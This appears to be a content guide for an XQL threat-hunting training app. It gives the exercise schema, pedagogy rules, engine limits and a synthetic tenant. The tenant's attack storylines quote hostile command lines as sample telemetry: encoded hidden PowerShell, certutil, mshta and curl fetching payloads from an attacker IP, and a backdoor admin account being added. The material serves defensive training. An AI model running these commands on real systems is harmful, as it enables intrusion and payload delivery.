# Exercise content guide

This file is the contract between the exercise bank (`js/content/exercises-*.js`) and the app.
Run `node test/validate-exercises.js` after every change: it executes every reference query against the
sample data and fails on anything the engine cannot run or that contradicts the engine's result.

## File shape

```js
(function (root) {
  const XQL = (root.XQL = root.XQL || {});
  XQL.EXERCISES = (XQL.EXERCISES || []).concat([
    { id: 'filter-01', concept: 'filter', type: 'mcq', difficulty: 1, title: '...', ... },
  ]);
})(typeof globalThis !== 'undefined' ? globalThis : this);
```

Concept ids (from `js/content/concepts.js`): `pipeline, filter, fields, strings, enums, sort-limit, comp, alter, time, dedup, join-union, advanced`.
Ids are `<concept>-<nn>`. Difficulty is 1 (first exposure) to 5 (hunting-grade).

Common fields: `id, concept, type, difficulty, title, explanation` (shown after answering; say *why*, 1-3 sentences),
optional `docs: [{ title, url }]` (vendor reference pages; use `https://cortex-docs.paloaltonetworks.com/xql-command-reference-guide/readme/stages/<stage>` and `.../functions/<function>`), optional `tags: []`.
Text fields support inline code with backticks and line breaks with `\n`.

## Exercise types

| type | fields | how it is graded |
|---|---|---|
| `concept` | `query` (worked example, one stage per line), `notes: [{ line: 0, text }]` (one per stage), `choices`, `answer` (index), `prompt` (the check question) | MCQ after the learner reads the annotated example and can step through the stages |
| `mcq` | `prompt`, optional `query`, `choices` (3-4), `answer` | index match |
| `predict` | `query`, `prompt` ("How many rows...", "Which host is first..."), `choices`, `answer`, `check` | index match; the validator runs `query` and asserts `check` (see below) so the key is provably right |
| `bug` | `query` (buggy, one stage per line), `bugLine` (0-based line index), `fix` (corrected query), `expectError` (true when the bug is a syntax/semantic error the engine rejects), `prompt` optional | learner clicks the broken line; validator runs both |
| `parsons` | `task`, `solution` (one stage per line, 3+ lines), optional `distractors: ["| limit 10"]` (0-2 wrong lines) | learner orders the shuffled lines; graded by executing the assembled query and comparing results with `solution` |
| `cloze` | `task`, `template` (query with `___` blanks), `answers: [["desc"], ["agent_hostname"]]` (accepted strings per blank, first is canonical), `solution` (full query) | graded by executing the filled query and comparing with `solution`; accepted strings give targeted feedback |
| `write` | `task` (what to find, in analyst language, naming the columns to return), `solution`, `hints: [stage list, skeleton, near-solution]` (2-3), optional `allowEmpty` | graded by executing the learner's query and comparing columns + rows with `solution` (row order matters only if the solution sorts) |

`check` for predict: `{ kind: 'rowCount', value: 3 }` | `{ kind: 'cell', row: 0, column: 'agent_hostname', value: 'WS-FIN-042' }` (value compared as displayed text) | `{ kind: 'values', column: 'n', value: [5, 3], ordered: true }` | `{ kind: 'columns', value: ['host', 'n'] }` | `{ kind: 'error' }` (the query must fail).

## Pedagogy rules

1. Each concept unit should progress: 1 `concept`, 2-3 `mcq`/`predict` (reading), 1 `bug`, 1 `parsons`, 2 `cloze`, 2-3 `write`. Difficulty rises through the unit.
2. Reading before writing: `predict` questions must be answerable from the query and the dataset (the learner can open the data). Prefer questions about row counts, first row after a sort, or the value of an aggregate.
3. Explanations teach the rule, not just the answer: "comp drops every field that is not a by field or an aggregate, so `event_type` no longer exists after it".
4. Distractor choices should be *plausible misconceptions* (wrong operator precedence, forgetting null rows are excluded, limit before sort, actor vs action, case sensitivity).
5. `write` tasks are analyst questions ("Which hosts ran PowerShell started by an Office application? Return hostname, user, and the command line, newest first."). Name the output columns and the sort order so the grader is fair. Use `fields` in the solution so the column set is explicit.
6. Use the real Cortex field names and the documented syntax only. Direction before field in sort (`sort desc _time`). Aggregates always aliased with `as`.
7. Mention vendor gotchas from the reference where relevant: comp is blocking, join/union/dedup lose order, limit after sort, config first, fields has no functions, concat needs to_string, json_extract_scalar returns text, case-insensitive by default.
8. Keep every query runnable in the sandbox (see "Engine support"). Keep bug exercises to one bug.

## The sample tenant (what the data says)

Clock frozen at **2026-10-27 08:00 UTC**. Events span 2026-10-13 to 2026-10-27, so `config timeframe = 24h`, `7d` and `30d` return different subsets.

Hosts (agent_hostname / agent_os_type / user): WS-FIN-042 (Windows, ACME\s.hudson), WS-HR-017 (Windows, ACME\p.beesly and NT AUTHORITY\SYSTEM), WS-SALES-023 (Windows, ACME\j.halpert), SRV-DC-01 (Windows, ACME\administrator, ACME\svc_backup, SYSTEM), SRV-WEB-02 (Windows, IIS APPPOOL\DefaultAppPool), LAPTOP-SEC-09 (Windows, ACME\d.schrute), MAC-DESIGN-03 (macOS = 2, a.martin), LNX-BUILD-11 (Linux = 4, jenkins).

Storylines in `xdr_data` (event_type 1 process, 2 network, 3 file, 4 registry, 6 load image):
- **WS-FIN-042, 26 Oct 09:10-09:16**: OUTLOOK.EXE opens Invoice_Q3.docm in WINWORD.EXE, which starts `powershell.exe -nop -w hidden -enc ...`; PowerShell beacons to 185.220.101.45:443 (DE), runs `cmd.exe /c whoami /all`, then `certutil.exe -urlcache ... http://185.220.101.45/update.exe`; update.exe (unsigned, sha256 b1946ac9...a0b2, listed in `ioc_hashes`) is written to Temp, runs, uploads 52,428,800 bytes to 185.220.101.45:4444, creates a scheduled task "WindowsUpdateCheck" and a Run key. causality_actor_process_image_name is OUTLOOK.EXE for the chain. Also normal chrome/outlook activity on 14, 22 and 27 Oct.
- **WS-HR-017, 26 Oct 10:30-11:06**: EXCEL.EXE opens Benefits_Enrollment.xlsm, sets VBAWarnings = 1, writes macro_helper.ps1, starts `powershell.exe -ExecutionPolicy Bypass -File ...macro_helper.ps1`, which connects to pastebin.com. On 24 Oct 22:15 SYSTEM runs PSEXESVC.exe -> cmd.exe -> `net user backup_svc P@ssw0rd123 /add` and `net localgroup administrators backup_svc /add`. Old EXCEL event on 13 Oct; OUTLOOK on 27 Oct.
- **WS-SALES-023, 25-26 Oct**: chrome downloads and runs AnyDesk.exe (signed philandro Software GmbH), which connects to relay-1.anydesk.com (185.33.12.5, DE) uploading 8,388,608 bytes and sets a Run key; a 3,200,000-byte file is written to E:\customer_list_export.xlsx; on 26 Oct 16:00 `mshta.exe http://185.220.101.45/a.hta` connects to the C2.
- **SRV-DC-01**: administrator runs `PsExec.exe \\SRV-WEB-02 cmd.exe` on 15 Oct and `PsExec.exe \\WS-HR-017 -s cmd.exe` on 24 Oct 22:15 (SMB to 10.10.21.17:445); nightly wbadmin backup on 22 Oct writes a 48,000,000,000-byte vhdx.
- **SRV-WEB-02, 23 Oct 11:11-11:14**: w3wp.exe -> cmd.exe -> whoami (web shell), then cmd -> powershell Invoke-WebRequest from 185.220.101.45 writing C:\inetpub\wwwroot\sh.ps1.
- **LAPTOP-SEC-09**: legitimate analyst: python.exe (21 Oct), powershell inventory.ps1 and `nmap.exe -sS -p 445,3389 10.10.20.0/24` with three internal connections (26 Oct 13:00-13:06).
- **MAC-DESIGN-03, 26 Oct 15:30**: osascript credential dialog, curl downloads https://185.220.101.45/m.sh to /tmp/m.sh, bash runs it.
- **LNX-BUILD-11, 20 Oct**: jenkins CI: java -> bash, curl get.docker.com.

Useful facts: 71 rows in xdr_data (39 process, 17 network, 10 file, 3 registry, 2 load image); per host: WS-FIN-042 21, WS-HR-017 15, WS-SALES-023 9, SRV-DC-01 6, LAPTOP-SEC-09 6, SRV-WEB-02 6, MAC-DESIGN-03 5, LNX-BUILD-11 3. powershell.exe was started on 4 hosts (WS-FIN-042 by WINWORD.EXE, WS-HR-017 by EXCEL.EXE, SRV-WEB-02 by cmd.exe, LAPTOP-SEC-09 by explorer.exe). 185.220.101.45 is contacted by 4 hosts (WS-FIN-042 three times, SRV-WEB-02, MAC-DESIGN-03, WS-SALES-023), total upload 52,739,360 bytes. Only update.exe matches `ioc_hashes`. `hva_hosts` lists SRV-DC-01 (tier-0), SRV-WEB-02, WS-FIN-042, LAPTOP-SEC-09. `user_directory` maps usernames to department/title/is_admin. action_country is null for internal destinations. dns_query_name is set only on connections that resolved a hostname (7 rows).

`microsoft_windows_raw` (host_name, event_id, event_result, event_data JSON string): five 4625 failures then a 4624 for ACME\administrator from 185.220.101.45 (WorkstationName KALI, LogonType 3) on 24 Oct 21:58-21:59; 7045 PSEXESVC service installed, 4720 backup_svc created, 4732 added to Administrators on WS-HR-017; interactive 4624 logons for s.hudson and p.beesly on 26 Oct; two svc_backup 4625 then 4624 from SRV-WEB-02.

`panw_ngfw_traffic_raw` (source_ip, dest_ip, dest_port, protocol, app, action, bytes_sent, bytes_received, rule_matched, session_end_reason): the same flows seen from the firewall, including the 52,428,800-byte upload to 185.220.101.45:4444 allowed by rule allow-any-out, two denied RDP sessions and one inbound SMB from the C2 IP.

Run `node -e "const X=require('./test/load').loadEngine(); console.log(X.run('dataset = xdr_data | filter event_type = 1 | comp count() as n by agent_hostname').rows)"` to check any fact.

## Engine support (the sandbox)

Supported and executed: config (case_sensitive, timeframe = / between), dataset (= name, in (...)), preset (xdr_process, xdr_file, xdr_registry, xdr_image_load, network_story), filter (all operators, in with sub-query, wildcards, null), fields (as, -, wildcards), alter, comp (count, count_distinct, sum, avg, min, max, median, values, list, earliest, latest, first, last), sort, limit, dedup (by asc/desc), bin (span, bins), join (type, conflict_strategy), union, replacenull, arrayexpand, top, target (last stage, no-op), view (no-op), tag, windowcomp (by / sort / between), iploc.
Functions: lowercase, uppercase, trim, len, concat, to_string, to_number, to_integer, to_boolean, split, arrayindex, array_length, arraystring, arraycreate, arraydistinct, arrayconcat, regextract, replace, replex, string_count, if, coalesce, json_extract_scalar, json_extract, json_extract_array, `->` sugar, timestamp_diff, extract_time, format_timestamp, parse_timestamp, date_floor, current_time, to_epoch, to_timestamp, incidr, is_ipv4, is_known_private_ipv4, wildcard_match, round, floor, ceil, abs, add, subtract, multiply, divide, pow, mod, greatest, least, format_string, extract_url_host.
Parsed but **not executed** (reading exercises only; `query` of an `mcq` may use them with `queryMayFail: true`): transaction, search, call, pivot, transpose.
Behavioural notes: `~=` is an unanchored, case-sensitive search (use ^ and $ to anchor, `(?i)` for case-insensitive); comparisons involving a null field yield null (SQL three-valued logic), so the row is dropped by filter, `not` of it is still null, and `not in (...)` drops it too unless `null` is listed; only `= null` / `!= null` are true or false; string vs number comparisons raise a type error (good material for bug exercises); `sort field` without a direction sorts ascending and emits a warning (the reference marks asc/desc as optional); `sort field desc` (direction after the field) is an error; misspelled `ENUM.` values for event_type / event_sub_type are errors; after `fields`, `_time` is still available for sort/comp but hidden, and the grader ignores system fields (`_time`, `_product`, `_vendor`) so listing them is never wrong; `comp` default alias is `func_field`; `top` percentages are exact; nulls sort first in `asc`.
